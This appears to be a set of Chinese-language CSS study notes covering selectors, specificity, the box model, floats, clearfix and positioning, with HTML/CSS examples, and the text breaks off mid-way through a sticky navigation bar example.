css基本语法\n\ncss由两部分组成，选择器和声明块，其中选择器用于选中需要添加样式的元素，声明块是对样式的具体设置。\n\n * 选择器，通过选择器可以选中页面中的指定元素。比如 p 的作用就是选中页面中所有的p元素\n * 声明块，通过声明块来指定要为元素设置的样式，声明块由一个一个的声明组成，一个名值对结构。一个样式名对应一个样式值，名和值之间以:连接，以;结尾。\n\np{\n  color: red;\n  font-size: 40px;\n}\n\nh1{\n  color: green;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# css选择器\n\n# 元素选择器\n\n作用：根据标签名来选中指定的元素\n\n语法：标签名{}\n\n例子：p{} h1{} div{}\n\n# id选择器\n\n作用：根据元素的id属性值选中一个元素\n\n语法：#id属性值{}\n\n例子：#box{} #red{}\n\n# 类选择器\n\n作用：根据元素的class属性值选中一组元素\n\n语法：.class属性值\n\n# 通配选择器\n\n作用：选中页面中的所有元素\n\n语法: *\n\n# 交集选择器\n\n作用：选中同时复合多个条件的元素\n\n语法：选择器1选择器2选择器3选择器n{}\n\n注意点：交集选择器中如果有元素选择器，必须使用元素选择器开头\n\ndiv.red{\n    font-size: 30px;\n}\n\n.a.b.c{\n    color: blue\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 选择器分组\n\n选择器分组（并集选择器）\n\n作用：同时选择多个选择器对应的元素\n\n语法：选择器1,选择器2,选择器3,选择器n{}\n\n#b1,.p1,h1,span,div.red{}\n\n# 子元素选择器\n\n父元素\n\n * 直接包含子元素的元素叫做父元素\n\n子元素\n\n * 直接被父元素包含的元素是子元素\n\n祖先元素\n\n * 直接或间接包含后代元素的元素叫做祖先元素\n * 一个元素的父元素也是它的祖先元素\n\n后代元素\n\n * 直接或间接被祖先元素包含的元素叫做后代元素\n * 子元素也是后代元素\n\n兄弟元素\n\n * 拥有相同父元素的元素是兄弟元素\n\n作用：选中指定父元素的指定子元素\n\n语法：父元素 > 子元素\n\n# 后代选择器\n\n作用：选中指定元素内的指定后代元素\n\n语法：祖先 后代\n\n# 兄弟元素选择器\n\n * 选择下一个兄弟\n\n语法：前一个 + 下一个\n\n * 选择下边所有的兄弟\n\n语法：兄 ~ 弟\n\n# 属性选择器\n\n[属性名] 选择含有指定属性的元素\n\n[属性名=属性值] 选择含有指定属性和属性值的元素\n\n[属性名^=属性值] 选择属性值以指定值开头的元素\n\n[属性名$=属性值] 选择属性值以指定值结尾的元素\n\n[属性名*=属性值] 选择属性值中含有某值的元素的元素\n\n# 伪类选择器\n\n伪类（不存在的类，特殊的类）\n\n * 伪类用来描述一个元素的特殊状态\n\n比如：第一个子元素、被点击的元素、鼠标移入的元素...\n\n伪类一般情况下都是使用:开头\n\n * :first-child 第一个子元素\n\n * :last-child 最后个子元素\n\n * :nth-child() 选中第n个子元素\n\n特殊值：\n\n * n 第n个 n的范围0到正无穷\n\n * 2n 或 even 表示选中偶数位的元素\n\n * 2n+1 或 odd 表示选中奇数位的元素\n\n以上这些伪类都是根据所有的子元素进行排序\n\n * :first-of-type\n\n * :last-of-type\n\n * :nth-of-type()\n\n这几个伪类的功能和上述的类似，不通点是他们是在同类型元素中进行排序\n\n * :not() 否定伪类\n\n将符合条件的元素从选择器中去除\n\n# 伪元素选择器\n\n伪元素，表示页面中一些特殊的并不真实的存在的元素（特殊的位置）\n\n伪元素使用 :: 开头\n\n * ::first-letter 表示第一个字母\n\n * ::first-line 表示第一行\n\n * ::selection 表示选中的内容\n\n * ::before 元素的开始\n\n * ::after 元素的最后\n\n * before 和 after 必须结合content属性来使用\n\n# 样式继承\n\n我们为一个元素设置的样式同时也会应用到它的后代元素上，继承是发生在祖先后后代之间的\n\n继承的设计是为了方便我们的开发，利用继承我们可以将一些通用的样式统一设置到共同的祖先元素上，这样只需设置一次即可让所有的元素都具有该样式\n\n注意：并不是所有的样式都会被继承：比如背景相关的，布局相关等的这些样式都不会被继承。\n\n# 选择器权重\n\n当我们通过不同的选择器，选中相同的元素，并且为相同的样式设置不同的值时，此时就发生了样式的冲突。发生样式冲突时，应用哪个样式由选择器的权重（优先级）决定。\n\n内联样式        1,0,0,0\n\nid选择器        0,1,0,0\n\n类和伪类选择器   0,0,1,0\n\n元素选择器       0,0,0,1\n\n通配选择器       0,0,0,0\n\n继承的样式       没有优先级\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n比较优先级时，需要将所有的选择器的优先级进行相加计算，最后优先级越高，则越优先显示（分组选择器是单独计算的），选择器的累加不会超过其最大的数量级，类选择器在高也不会超过id选择器。如果优先级计算后相同，此时则优先使用靠下的样式。可以在某一个样式的后边添加 !important ，则此时该样式会获取到最高的优先级，甚至超过内联样式，在开发中这个玩意一定要慎用！\n\n\n# 单位\n\n像素\n\n * 屏幕（显示器）实际上是由一个一个的小点点构成的\n * 不同屏幕的像素大小是不同的，像素越小的屏幕显示的效果越清晰\n * 所以同样的200px在不同的设备下显示效果不一样\n\n百分比\n\n * 也可以将属性值设置为相对于其父元素属性的百分比\n * 设置百分比可以使子元素跟随父元素的改变而改变\n\nem\n\n * em是相对于元素的字体大小来计算的\n * 1em = 1font-size\n * em会根据字体大小的改变而改变\n\nrem\n\n * rem是相对于根元素的字体大小来计算\n\n\n# 颜色\n\n在css中可以直接使用颜色名来设置各种颜色，比如：red、orange、yellow、blue、green……，但是在css中直接使用颜色名是非常的不方便。\n\nrgb值：\n\n * rgb通过三种颜色的不同浓度来调配出不同的颜色\n * r red，g green ，b blue\n * 每一种颜色的范围在 0 - 255 (0% - 100%) 之间\n * 语法：rgb(红色,绿色,蓝色)\n\nrgba:\n\n * 就是在rgb的基础上增加了一个a表示不透明度\n * 需要四个值，前三个和rgb一样，第四个表示不透明度 1表示完全不透明 0表示完全透明 .5半透明\n\n十六进制的rgb值：\n\n * 语法：#红色绿色蓝色\n * 颜色浓度通过 00-ff\n * 如果颜色两位两位重复可以进行简写 #aabbcc --\x3e #abc\n\nhsl值 hsla值\n\n * h 色相(0 - 360)\n * s 饱和度，颜色的浓度 0% - 100%\n * l 亮度，颜色的亮度 0% - 100%\n\nbackground-color: red;\nbackground-color: rgb(255, 0, 0);\nbackground-color: rgb(0, 255, 0);\nbackground-color: rgb(0, 0, 255);\nbackground-color: rgb(255,255,255);\nbackground-color: rgb(106,153,85);\nbackground-color: rgba(106,153,85,.5);\nbackground-color: #ff0000;\nbackground-color: #ffff00;\nbackground-color: #ff0;\nbackground-color: #bbffaa;\nbackground-color: #9cdcfe;\nbackground-color: rgb(254, 156, 156);\nbackground-color: hsla(98, 48%, 40%, 0.658);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 布局\n\n# 文档流\n\n文档流（normal flow）\n\n网页是一个多层的结构，一层摞着一层，通过css可以分别为每一层来设置样式，作为用户来讲只能看到最顶上一层。这些层中，最底下的一层称为文档流，文档流是网页的基础。我们所创建的元素默认都是在文档流中进行排列。对于我们来元素主要有两个状态，在文档流中，不在文档流中（脱离文档流）\n\n元素在文档流中有什么特点：\n\n * 块元素\n   * 块元素会在页面中独占一行(自上向下垂直排列)\n   * 默认宽度是父元素的全部（会把父元素撑满）\n   * 默认高度是被内容撑开（子元素）\n * 行内元素\n   * 行内元素不会独占页面的一行，只占自身的大小\n   * 行内元素在页面中左向右水平排列，如果一行之中不能容纳下所有的行内元素，则元素会换到第二行继续自左向右排列（书写习惯一致）\n   * 行内元素的默认宽度和高度都是被内容撑开\n\n# 盒子模型\n\n盒模型、盒子模型、框模型（box model）\n\ncss将页面中的所有元素都设置为了一个矩形的盒子，将元素设置为矩形的盒子后，对页面的布局就变成将不同的盒子摆放到不同的位位置。每一个盒子都由一下几个部分组成：\n\n * 内容区（content）\n\n * 内边距（padding）\n\n * 边框（border）\n\n * 外边距（margin）\n\n# 内容区\n\n内容区（content），元素中的所有的子元素和文本内容都在内容区中排列，内容区的大小由width 和 height两个属性来设置\n\n * width 设置内容区的宽度\n\n * height 设置内容区的高度\n\n# 边框\n\n边框（border），边框属于盒子边缘，边框里边属于盒子内部，出了边框都是盒子的外部，边框的大小会影响到整个盒子的大小。要设置边框，需要至少设置三个样式：\n\n * 边框的宽度 border-width\n\nborder-width: 10px;\n\n边框的默认值一般都是 3个像素，border-width可以用来指定四个方向的边框的宽度。\n\n根据不同的值的情况，有以下几种设置方式：\n\n * 四个值：上 右 下 左\n\n * 三个值：上 左右 下\n\n * 两个值：上下 左右\n\n * 一个值：上下左右\n\n除了border-width还有一组 border-xxx-width，xxx可以是 top right bottom left。用来单独指定某一个边的宽度\n\n * 边框的颜色 border-color\n\nborder-color用来指定边框的颜色，同样可以分别指定四个边的边框，规则和border-width一样\n\nborder-color也可以省略不写，如果省略了则自动使用color的颜色值。\n\n * 边框的样式 border-style\n\nborder-style 指定边框的样式\n\n * solid 表示实线\n\n * dotted 点状虚线\n\n * dashed 虚线\n\n * double 双线\n\n * border-style的默认值是none 表示没有边框\n\nborder简写属性，通过该属性可以同时设置边框所有的相关样式，并且没有顺序要求。除了border以外还有四个 border-xxx\n\n * border-top\n\n * border-right\n\n * border-bottom\n\n * border-left\n\nborder: solid 10px orange;\nborder-top: 10px solid red\n\n\n1\n2\n\n\n# 内边距\n\n内容区和边框之间的距离是内边距，一共有四个方向的内边距：\n\n * padding-top\n * padding-right\n * padding-bottom\n * padding-left\n\n内边距的设置会影响到盒子的大小，背景颜色会延伸到内边距上。一个盒子的可见框的大小，由内容区 内边距 和 边框共同决定，所以在计算盒子大小时，需要将这三个区域加到一起计算。\n\n/* padding-top: 100px;\npadding-left: 100px;\npadding-right: 100px;\npadding-bottom: 100px; */\n\n/* \npadding 内边距的简写属性，可以同时指定四个方向的内边距\n规则和border-width 一样\n*/\npadding: 10px 20px 30px 40px;\npadding: 10px 20px 30px ;\npadding: 10px 20px ;\npadding: 10px ;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 外边距\n\n外边距不会影响盒子可见框的大小，但是外边距会影响盒子的位置。一共有四个方向的外边距：\n\nmargin-top\n\n * 上外边距，设置一个正值，元素会向下移动\n\nmargin-right\n\n * 默认情况下设置margin-right不会产生任何效果\n\nmargin-bottom\n\n * 下外边距，设置一个正值，其下边的元素会向下移动\n\nmargin-left\n\n * 左外边距，设置一个正值，元素会向右移动\n\nmargin也可以设置负值，如果是负值则元素会向相反的方向移动。元素在页面中是按照自左向右的顺序排列的，所以默认情况下如果我们设置的左和上外边距则会移动元素自身。而设置下和右外边距会移动其他元素\n\nmargin的简写属性：margin 可以同时设置四个方向的外边距 ，用法和padding一样。margin会影响到盒子实际占用空间。\n\n/* margin-top: 100px;\nmargin-left: 100px;\nmargin-bottom: 100px; */\n\n/* margin-bottom: 100px; */\n/* margin-top: -100px; */\n/* margin-left: -100px; */\n/* margin-bottom: -100px; */\n\n/* margin-right: 0px; */\n\nmargin: 100px;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 盒子模型的水平布局\n\n元素的水平方向的布局：元素在其父元素中水平方向的位置由以下几个属性共同决定：\n\n * margin-left\n * border-left\n * padding-left\n * width\n * padding-right\n * border-right\n * margin-right\n\n一个元素在其父元素中，水平布局必须要满足以下的等式 margin-left+border-left+padding-left+width+padding-right+border-right+margin-right = 其父元素内容区的宽度 （必须满足）\n\n如以下的例子：\n\n0 + 0 + 0 + 200 + 0 + 0 + 0 = 800\n0 + 0 + 0 + 200 + 0 + 0 + 600 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 400 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 500 = 800\n\n\n1\n2\n3\n4\n\n\n以上等式必须满足，如果相加结果使等式不成立，则称为过度约束，则等式会自动调整。\n\n调整的方式：\n\n如果这七个值中没有为 auto 的情况，则浏览器会自动调整margin-right值以使等式满足。这七个值中有三个值可以设置为auto\n\n * width\n * margin-left\n * maring-right\n\n如果某个值为auto，则会自动调整为auto的那个值以使等式成立。\n\n0 + 0 + 0 + auto + 0 + 0 + 0 = 800  auto = 800\n0 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 600\n200 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + auto = 800  auto = 300\n\n\n1\n2\n3\n4\n5\n\n\n如果将一个宽度和一个外边距设置为auto，则宽度会调整到最大，设置为auto的外边距会自动为0。\n\n如果将三个值都设置为auto，则外边距都是0，宽度最大\n\n如果将两个外边距设置为auto，宽度固定值，则会将外边距设置为相同的值。所以我们经常利用这个特点来使一个元素在其父元素中水平居中。\n\nwidth:xxxpx;\nmargin:0 auto;\n\n\n1\n2\n\n\n# 盒子垂直布局\n\n默认情况下父元素的高度被内容撑开，子元素是在父元素的内容区中排列的，如果子元素的大小超过了父元素，则子元素会从父元素中溢出。使用 overflow 属性来设置父元素如何处理溢出的子元素：\n\n * visible，默认值 子元素会从父元素中溢出，在父元素外部的位置显示\n\n * hidden 溢出内容将会被裁剪不会显示\n\n * scroll 生成两个滚动条，通过滚动条来查看完整的内容\n\n * auto 根据需要生成滚动条\n\noverflow-x: \n\noverflow-y:\n\n\n1\n2\n3\n\n\n# 垂直外边距的折叠\n\n相邻的垂直方向外边距会发生重叠现象\n\n兄弟元素\n\n * 兄弟元素间的相邻垂直外边距会取两者之间的较大值（两者都是正值）\n\n * 特殊情况：如果相邻的外边距一正一负，则取两者的和。如果相邻的外边距都是负值，则取两者中绝对值较大的\n\n * 兄弟元素之间的外边距的重叠，对于开发是有利的，所以我们不需要进行处理\n\n父子元素\n\n * 父子元素间相邻外边距，子元素的会传递给父元素（上外边距）\n * 父子外边距的折叠会影响到页面的布局，必须要进行处理\n\n# 行内元素的盒子模型\n\n * 行内元素不支持设置宽度和高度\n\n * 行内元素可以设置padding，但是垂直方向padding不会影响页面的布局\n\n * 行内元素可以设置border，垂直方向的border不会影响页面的布局\n\n * 行内元素可以设置margin，垂直方向的margin不会影响布局\n\ndisplay 用来设置元素显示的类型，有以下几种可选值。\n\n * inline 将元素设置为行内元素\n\n * block 将元素设置为块元素\n\n * inline-block 将元素设置为行内块元素，既可以设置宽度和高度又不会独占一行\n\n * table 将元素设置为一个表格\n\n * none 元素不在页面中显示\n\nvisibility 用来设置元素的显示状态\n\n * visible 默认值，元素在页面中正常显示\n\n * hidden 元素在页面中隐藏 不显示，但是依然占据页面的位置\n\n# 默认样式\n\n通常情况，浏览器都会为元素设置一些默认样式，默认样式的存在会影响到页面的布局，通常情况下编写网页时必须要去除浏览器的默认样式（pc端的页面）。\n\nbody{\n  margin: 0;\n}\n\np{\n  margin: 0;\n}\n\nul{\n  margin: 0;\n  padding: 0;\n  /*去除项目符号*/\n  list-style:none; \n}\n\n*{\n  margin: 0;\n  padding: 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n重置样式表：专门用来对浏览器的样式进行重置的。\n\n * reset.css 直接去除了浏览器的默认样式\n * normalize.css 对默认样式进行了统一\n\n# 盒子尺寸\n\n默认情况下，盒子可见框的大小由内容区、内边距和边框共同决定。box-sizing 用来设置盒子尺寸的计算方式（设置width和height的作用）。\n\n * content-box 默认值，宽度和高度用来设置内容区的大小\n\n * border-box 宽度和高度用来设置整个盒子可见框的大小\n\n * width 和 height 指的是内容区 和 内边距 和 边框的总大小\n\n# 轮廓和圆角\n\nbox-shadow 用来设置元素的阴影效果，阴影不会影响页面布局 。\n\n * 第一个值 水平偏移量 设置阴影的水平位置 正值向右移动 负值向左移动\n\n * 第二个值 垂直偏移量 设置阴影的水平位置 正值向下移动 负值向上移动\n\n * 第三个值 阴影的模糊半径\n\n * 第四个值 阴影的颜色\n\noutline 用来设置元素的轮廓线，用法和border一模一样。轮廓和边框不同的点，就是轮廓不会影响到可见框的大小。\n\nborder-radius: 用来设置圆角 圆角设置的圆的半径大小：\n\n/* border-top-left-radius:  */\n/* border-top-right-radius */\n/* border-bottom-left-radius:  */\n/* border-bottom-right-radius:  */\n/* border-top-left-radius:50px 100px; */\n\n\n1\n2\n3\n4\n5\n\n\nborder-radius 可以分别指定四个角的圆角\n\n * 四个值 左上 右上 右下 左下\n\n * 三个值 左上 右上/左下 右下\n\n * 两个个值 左上/右下 右上/左下\n\n/* 将元素设置为一个圆形 */\nborder-radius: 50%;    \n\n\n1\n2\n\n\n\n# 浮动\n\n通过浮动可以使一个元素向其父元素的左侧或右侧移动，使用 float 属性来设置于元素的浮动。\n\n * none 默认值 ，元素不浮动\n\n * left 元素向左浮动\n\n * right 元素向右浮动\n\n注意，元素设置浮动以后，水平布局的等式便不需要强制成立。元素设置浮动以后，会完全从文档流中脱离，不再占用文档流的位置，所以元素下边的还在文档流中的元素会自动向上移动。\n\n浮动的特点：\n\n1、浮动元素会完全脱离文档流，不再占据文档流中的位置\n\n2、设置浮动以后元素会向父元素的左侧或右侧移动，\n\n3、浮动元素默认不会从父元素中移出\n\n4、浮动元素向左或向右移动时，不会超过它前边的其他浮动元素\n\n5、如果浮动元素的上边是一个没有浮动的块元素，则浮动元素无法上移\n\n6、浮动元素不会超过它上边的浮动的兄弟元素，最多最多就是和它一样高\n\n7、浮动元素不会盖住文字，文字会自动环绕在浮动元素的周围，所以我们可以利用浮动来设置文字环绕图片的效果\n\n简单总结：\n\n浮动目前来讲它的主要作用就是让页面中的元素可以水平排列，通过浮动可以制作一些水平方向的布局。元素设置浮动以后，将会从文档流中脱离，从文档流中脱离后，元素的一些特点也会发生变化。\n\n脱离文档流的特点：\n\n块元素：\n\n1、块元素不在独占页面的一行\n\n2、脱离文档流以后，块元素的宽度和高度默认都被内容撑开\n\n行内元素：\n\n1、行内元素脱离文档流以后会变成块元素，特点和块元素一样\n\n脱离文档流以后，不需要再区分块和行内了\n\n# 网页的基础布局\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n\n      header, main, footer{\n        width: 1000px;\n        margin: 0 auto;\n      }\n\n      /* 设置头部 */\n      header{\n        height: 150px;\n        background-color: silver;\n      }\n\n      /* 设置主体 */\n      main{\n        height: 500px;\n        background-color: #bfa;\n        margin: 10px auto;\n      }\n\n      nav, article, aside{\n        float: left;\n        height: 100%;\n      }\n\n      /* 设置左侧的导航 */\n      nav{\n        width: 200px;\n        background-color: yellow;\n      }\n\n      /* 设置中间的内容 */\n      article{\n        width: 580px;\n        background-color: orange;\n        margin: 0 10px;\n      }\n\n      /* 设置右侧的内容 */\n      aside{\n        width: 200px;\n        background-color: pink;\n      }\n\n      /* 设置底部 */\n      footer{\n        height: 150px;\n        background-color: tomato;\n      }\n    </style>\n  </head>\n  <body>\n\n    \x3c!-- 创建头部 --\x3e\n    <header></header>\n\n    \x3c!-- 创建网页的主体 --\x3e\n    <main>\n      \x3c!-- 左侧导航 --\x3e\n      <nav></nav>\n\n      \x3c!-- 中间的内容 --\x3e\n      <article></article>\n\n      \x3c!-- 右边的边栏 --\x3e\n      <aside></aside>\n\n    </main>\n\n    \x3c!-- 网页的底部 --\x3e\n    <footer></footer>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n# 高度塌陷问题\n\n在浮动布局中，父元素的高度默认是被子元素撑开的，当子元素浮动后，其会完全脱离文档流，子元素从文档流中脱离，将会无法撑起父元素的高度，导致父元素的高度丢失。父元素高度丢失以后，其下的元素会自动上移，导致页面的布局混乱。所以高度塌陷是浮动布局中比较常见的一个问题，这个问题我们必须要进行处理！\n\nbfc(block formatting context) 块级格式化环境：bfc是一个css中的一个隐含的属性，可以为一个元素开启bfc。开启bfc该元素会变成一个独立的布局区域\n\n元素开启bfc后的特点：\n\n 1. 开启bfc的元素不会被浮动元素所覆盖\n 2. 开启bfc的元素子元素和父元素外边距不会重叠\n 3. 开启bfc的元素可以包含浮动的子元素\n\n可以通过一些特殊方式来开启元素的bfc：\n\n 1. 设置元素的浮动（不推荐）\n 2. 将元素设置为行内块元素（不推荐）\n 3. 将元素的overflow设置为一个非visible的值\n\n常用的方式：为元素设置 overflow:hidden 开启其bfc 以使其可以包含浮动元素。\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n      .outer{\n        border: 10px red solid;\n        overflow: hidden;\n      }\n\n      .inner{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="outer">\n\n      <div class="inner"></div>\n\n    </div>\n\n    <div style="width: 200px;height: 200px;background-color:yellow;"></div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# clear清除浮动影响\n\n由于box1的浮动，导致box3位置上移。也就是box3收到了box1浮动的影响，位置发生了改变。\n\n如果我们不希望某个元素因为其他元素浮动的影响而改变位置，可以通过clear属性来清除浮动元素对当前元素所产生的影响\n\n作用：清除浮动元素对当前元素所产生的影响\n\n可选值：\n\n * left 清除左侧浮动元素对当前元素的影响\n\n * right 清除右侧浮动元素对当前元素的影响\n\n * both 清除两侧中最大影响的那侧\n\n原理：设置清除浮动以后，浏览器会自动为元素添加一个上外边距，以使其位置不受其他元素的影响\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n\n      div{\n        font-size: 50px;\n      }\n\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box2{\n        width: 400px;\n        height: 150px;\n        background-color: #ff0;\n        float: right;\n      }\n\n      .box3{\n        width: 200px;\n        height: 200px;\n        background-color: orange;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">1</div>\n    <div class="box2">2</div>\n    <div class="box3">3</div> \n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n# 高度塌陷问题的解决方案\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n      .box1{\n        border: 10px red solid;\n\n        /* overflow: hidden; */\n      }\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box3{\n        clear: both;\n      }\n\n      .box1::after{\n        content: \'\';\n        display: block;\n        clear: both;\n      }\n\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">\n      <div class="box2"></div>\n      \x3c!-- <div class="box3"></div> --\x3e\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n# clearfix\n\nclearfix 这个样式可以同时解决高度塌陷和外边距重叠的问题，当你在遇到这些问题时，直接使用clearfix这个类即可 。\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <style>\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n      }\n\n      /* .box1::before{\n      content: \'\';\n      display: table;\n      } */\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: orange;\n        margin-top: 100px;\n      }\n\n      /* clearfix 这个样式可以同时解决高度塌陷和外边距重叠的问题，当你在遇到这些问题时，直接使用clearfix这个类即可 */\n      .clearfix::before,\n      .clearfix::after{\n        content: \'\';\n        display: table;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1 clearfix">\n      <div class="box2"></div>\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 定位\n\n# 定位简介\n\n定位（position）\n\n定位是一种更加高级的布局手段，通过定位可以将元素摆放到页面的任意位置。使用position属性来设置定位。\n\n * static 默认值，元素是静止的没有开启定位\n * relative 开启元素的相对定位\n * absolute 开启元素的绝对定位\n * fixed 开启元素的固定定位\n * sticky 开启元素的粘滞定位\n\n相对定位：\n\n当元素的position属性值设置为relative时则开启了元素的相对定位。\n\n相对定位的特点：\n\n 1. 元素开启相对定位以后，如果不设置偏移量元素不会发生任何的变化\n 2. 相对定位是参照于元素在文档流中的位置进行定位的\n 3. 相对定位会提升元素的层级\n 4. 相对定位不会使元素脱离文档流\n 5. 相对定位不会改变元素的性质块还是块，行内还是行内\n\n偏移量（offset）\n\n当元素开启了定位以后，可以通过偏移量来设置元素的位置\n\ntop\n\n * 定位元素和定位位置上边的距离\n\nbottom\n\n * 定位元素和定位位置下边的距离，定位元素垂直方向的位置由top和bottom两个属性来控制。通常情况下我们只会使用其中一\n * top值越大，定位元素越向下移动\n * bottom值越大，定位元素越向上移动\n\nleft\n\n * 定位元素和定位位置的左侧距离\n\nright\n\n * 定位元素和定位位置的右侧距离\n * 定位元素水平方向的位置由left和right两个属性控制。通常情况下只会使用一个\n * left越大元素越靠右\n * right越大元素越靠左\n\n# 绝对定位\n\n绝对定位\n- 当元素的position属性值设置为absolute时，则开启了元素的绝对定位\n- 绝对定位的特点：\n1.开启绝对定位后，如果不设置偏移量元素的位置不会发生变化\n2.开启绝对定位后，元素会从文档流中脱离\n3.绝对定位会改变元素的性质，行内变成块，块的宽高被内容撑开\n4.绝对定位会使元素提升一个层级\n5.绝对定位元素是相对于其包含块进行定位的\n\n包含块( containing block )\n- 正常情况下：\n包含块就是离当前元素最近的祖先块元素\n&lt;div> &lt;div>&lt;/div> &lt;/div>\n&lt;div>&lt;span>&lt;em>hello&lt;/em>&lt;/span>&lt;/div>\n\n- 绝对定位的包含块:\n包含块就是离它最近的开启了定位的祖先元素，\n如果所有的祖先元素都没有开启定位则根元素就是它的包含块\n- html（根元素、初始包含块）\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 固定定位\n\n将元素的position属性设置为fixed则开启了元素的固定定位。固定定位也是一种绝对定位，所以固定定位的大部分特点都和绝对定位一样，唯一不同的是固定定位永远参照于浏览器的视口进行定位。固定定位的元素不会随网页的滚动条滚动。\n\n# 粘滞定位\n\n当元素的position属性设置为sticky时则开启了元素的粘滞定位，粘滞定位和相对定位的特点基本一致，不同的是粘滞定位可以在元素到达某个位置时将其固定。\n\n<!doctype html>\n<html lang="en">\n\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>导航条</title>\n    <link rel="stylesheet" href="./css/reset.css">\n    <style>\n\n      body{\n        height: 3000px;\n      }\n\n      /* 设置nav的大小 */\n      .nav{\n\n        /* 设置宽度和高度 */\n        width: 1210px;\n        height: 48px;\n        /* 设置背景颜色 */\n        background-color: #e8e7e3;\n\n        margin:100px auto;\n\n        position: sticky;\n        top: 10px;\n\n      }\n\n      /* 设置nav中li */\n      .nav li{\n        /* 设置li向左浮动，已使菜单横向排列 */\n        float: left;\n        /* 设置li的高度 */\n        /* height: 48px; */\n        /* 将文字在父元素中垂直居中 */\n        line-height: 48px;\n\n      }\n\n      /* 设置a的样式 */\n      .nav a{\n        /* 将a转换为块元素 */\n        display: block;\n        /* 去除下划线 */\n        text-decoration: none;\n        /* 设置字体颜色 */\n        color: #777777;\n        /* 修改字体大小 */\n        font-size: 18px;\n\n        padding: 0 39px;\n      }\n\n      .nav li:last-child a{\n        padding: 0 42px 0 41px;\n      }\n\n      /* 设置鼠标移入的效果 */\n      .nav a:hover{\n        background-color: #3f3f3f;\n        color: #e8e7e3;\n      }\n    </style>\n  </head>\n\n  <body>\n    \x3c!-- 创建导航条的结构 --\x3e\n    <ul class="nav">\n      <li>\n        <a href="#">html/css</a>\n      </li>\n      <li>\n        <a href="#">browser side</a>\n      </li>\n      <li>\n        <a href="#">server side</a>\n      </li>\n      <li>\n        <a href="#">programming</a>\n      </li>\n      <li>\n        <a href="#">xml</a>\n      </li>\n      <li>\n        <a href="#">web building</a>\n      </li>\n      <li>\n        <a 